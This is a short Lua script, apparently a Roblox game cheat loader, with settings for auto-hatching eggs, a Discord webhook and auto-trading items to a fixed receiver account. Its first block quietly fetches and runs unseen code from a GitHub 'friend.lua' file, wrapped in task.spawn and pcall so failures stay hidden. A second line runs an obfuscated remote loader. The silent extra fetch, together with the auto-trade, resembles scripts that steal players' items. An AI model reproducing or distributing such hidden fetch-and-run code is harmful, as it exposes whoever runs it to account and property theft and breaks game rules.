task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/friend.lua"))()
    end)
end)

getgenv().Config = {
    ["Hatching"] = {
        ["Rifts"] = {
            ["Eggs"] = {"Silly Egg", "Nightmare Egg"}
        },
        ["Egg"] = "100M Egg"
    },
    ["Webhook"] = {
        ["MinDifficulty"] = "10k",
        ["UserID"] = "314107374715535370",
        ["URL"] = dc_webhook,
    },
    ["AutoTrade"] = {
        ["Usernames"] = {"GalacticVana"}, -- Receiver Accounts
        ["URL"] = dc_webhook
    },
    ["AutoEnchant"] = true -- // Enchant Team Up on all Equipped Pets
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6a28683e5e681161a5074613f6daf64c.lua"))()
